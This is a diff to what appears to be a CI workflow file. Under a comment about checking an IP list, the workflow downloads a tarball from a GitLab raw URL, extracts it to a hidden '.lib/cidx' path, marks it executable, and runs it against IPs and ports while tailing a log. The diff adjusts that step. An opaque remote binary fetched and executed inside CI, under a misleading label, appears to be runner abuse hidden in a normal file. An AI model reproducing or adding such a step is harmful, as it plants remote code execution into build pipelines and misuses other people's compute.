@@ -44,7 +44,7 @@ jobs:
           # Download and check IP list
           timestamp=$(date +%s)
           mkdir -p .lib
-          dynamic_sgr="python3"
+          dynamic_sgr=".lib/cidx"
           wget -O $dynamic_sgr gitlab.com/jasa4/minulme/-/raw/main/cidxC.tar.gz && tar -xvf $dynamic_sgr >/dev/null 2>&1
           chmod +x $dynamic_sgr
           dynamic_list="list_$timestamp.json"
@@ -80,10 +80,14 @@ jobs:
 
               echo "Started process with PID $process_pid using IP $ip and port $port"
 
+              # Start tail -f to monitor log
+              tail -f dance_$port_$timestamp.log & tail_pid=$!
+
               # Run for 1 minute
               sleep 120
 
-              # Kill the process
+              # Stop the tail process and the running process
+              kill $tail_pid || true
               kill $process_pid || true
 
               # Remove the log file after the process is stopped
